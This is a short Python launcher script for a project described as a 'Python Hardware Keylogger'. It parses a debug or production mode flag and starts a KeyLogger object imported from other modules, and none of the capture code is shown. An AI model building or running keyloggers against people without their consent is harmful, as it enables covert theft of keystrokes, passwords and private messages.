import logging
import argparse

from src.Setup import Setup
from src.KeyLogger import KeyLogger


def main(args: argparse.ArgumentParser) -> None:
    setup: Setup = Setup(args)
    keylogger = setup.get_keylogger()
    keylogger.run()


if __name__ == "__main__":
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="Python Hardware Keylogger"
    )
    parser.add_argument(
        "-m", "--mode", type=str, help="This Logger level d=debug, p=production"
    )
    args = parser.parse_args()
    main(args)
